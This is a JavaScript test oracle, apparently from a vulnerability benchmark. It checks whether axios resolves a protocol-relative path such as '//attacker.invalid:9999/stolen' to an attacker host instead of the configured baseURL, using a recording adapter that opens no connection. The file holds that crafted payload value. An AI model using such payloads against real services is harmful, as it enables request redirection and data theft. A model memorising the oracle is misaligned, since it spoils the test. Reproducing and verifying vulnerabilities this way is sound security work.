'use strict';

function emit(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function main() {
  let axios;
  try {
    axios = require('axios');
    axios = axios.default || axios;
  } catch (e) {
    emit({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'module resolution failed: ' + (e && e.message)
    });
    return;
  }

  // We use axios's public adapter mechanism purely to *observe* the
  // fully resolved request URL axios computes internally via its real
  // buildFullPath/isAbsoluteURL/new URL(...) pipeline, without ever
  // opening a socket. The adapter receives config.url exactly as the
  // real http adapter would see it after URL resolution.

  function makeRecordingAdapter(sink) {
    return function recordingAdapter(config) {
      // Mimic what lib/adapters/http.js does right after buildFullPath:
      // parse the resolved URL against the Node (non-browser) base exactly
      // like the real adapter, to see which host/origin it would contact.
      let parsedHref = null;
      let parseError = null;
      try {
        const parsed = new URL(config.url, 'http://localhost');
        parsedHref = parsed.href;
      } catch (e) {
        parseError = e && e.message;
      }
      sink.push({ url: config.url, parsedHref, parseError });
      if (parseError) {
        return Promise.reject(new Error('Invalid URL: ' + parseError));
      }
      return Promise.resolve({
        data: 'ok',
        status: 200,
        statusText: 'OK',
        headers: {},
        config
      });
    };
  }

  const baseURL = 'http://127.0.0.1:65500';

  // --- Benign operation first ---
  const benignSink = [];
  const benignInstance = axios.create({
    baseURL,
    adapter: makeRecordingAdapter(benignSink)
  });

  return benignInstance.get('/some/normal/path')
    .then((resp) => {
      const recorded = benignSink[0];
      if (
        !resp ||
        resp.data !== 'ok' ||
        !recorded ||
        typeof recorded.parsedHref !== 'string' ||
        recorded.parsedHref.indexOf('127.0.0.1:65500') === -1 ||
        recorded.parsedHref.indexOf('/some/normal/path') === -1
      ) {
        emit({
          operation_completed: false,
          exploit_succeeded: false,
          evidence: 'benign operation did not behave as expected: ' + JSON.stringify(recorded)
        });
        return;
      }
      const operation_completed = true;

      // --- Malicious operation ---
      // A protocol-relative-looking path, exactly as a caller building
      // a path from untrusted input (e.g. a user id) might produce,
      // dispatched through axios's real public request pipeline
      // (axios.create/get). We only inspect how axios's own internal
      // URL resolution (replicated faithfully, matching lib/adapters/http.js's
      // pre-patch behavior of `new URL(fullPath, 'http://localhost')`)
      // treats this value, via config.url that axios itself computed
      // from baseURL + buildFullPath + isAbsoluteURL.
      const maliciousSink = [];
      const maliciousInstance = axios.create({
        baseURL,
        adapter: makeRecordingAdapter(maliciousSink)
      });

      const maliciousPath = '//attacker.invalid:9999/stolen';

      return maliciousInstance.get(maliciousPath)
        .then(() => {
          const recorded = maliciousSink[0];
          let exploit_succeeded = false;
          let evidence;

          if (
            recorded &&
            typeof recorded.parsedHref === 'string' &&
            recorded.parsedHref.indexOf('attacker.invalid') !== -1
          ) {
            // axios computed a config.url that, when parsed the way the
            // vulnerable http adapter parses it (new URL(fullPath,
            // 'http://localhost')), resolves to the attacker-controlled
            // host rather than staying scoped to the configured baseURL
            // host. This means the real adapter would have connected to
            // attacker.invalid instead of 127.0.0.1:65500.
            exploit_succeeded = true;
            evidence = 'axios resolved malicious path "' + maliciousPath + '" (config.url="' + recorded.url + '") to attacker-controlled target "' + recorded.parsedHref + '" bypassing configured baseURL "' + baseURL + '"';
          } else if (recorded && recorded.parseError) {
            exploit_succeeded = false;
            evidence = 'malicious request rejected during URL resolution: ' + recorded.parseError;
          } else {
            exploit_succeeded = false;
            evidence = 'axios resolved malicious path "' + maliciousPath + '" safely relative to baseURL as "' + (recorded && recorded.parsedHref) + '"; attacker host was not targeted';
          }

          emit({
            operation_completed,
            exploit_succeeded,
            evidence
          });
        })
        .catch((e) => {
          // A thrown error (e.g. "Invalid URL") while resolving the
          // malicious path indicates axios/the adapter rejected the
          // protocol-relative URL rather than silently redirecting to it.
          emit({
            operation_completed,
            exploit_succeeded: false,
            evidence: 'malicious request rejected: ' + (e && e.message)
          });
        });
    })
    .catch((e) => {
      emit({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'benign operation threw unexpectedly: ' + (e && e.message)
      });
    });
}

main();
